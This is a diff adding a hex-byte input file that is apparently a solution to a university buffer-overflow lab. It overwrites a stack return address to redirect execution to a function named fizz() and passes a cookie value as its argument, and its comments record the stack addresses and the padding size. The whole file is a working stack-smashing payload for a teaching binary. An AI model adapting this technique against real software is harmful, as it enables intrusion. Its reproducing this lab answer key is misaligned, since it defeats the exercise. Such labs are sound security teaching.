@@ -1,0 +1,13 @@
+/* getbuf return address is located at address: 0x55683754 */
+/* fizz() return address is located at address: 0x55683758 */
+/* fizz() argument address is located at address: 0x5568375c */
+/* Local buffer starts at address: 0x55683728 */
+/* Padding required: 44 Bytes(exclude 4 Bytes return address, and 4 Bytes argument) */
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+/* fizz() is located at address: 0x08048cba */
+ba 8c 04 08
+/* casual fizz return address */
+00 00 00 00
+/* cookie = 2a8ea010 */
+10 a0 8e 2a
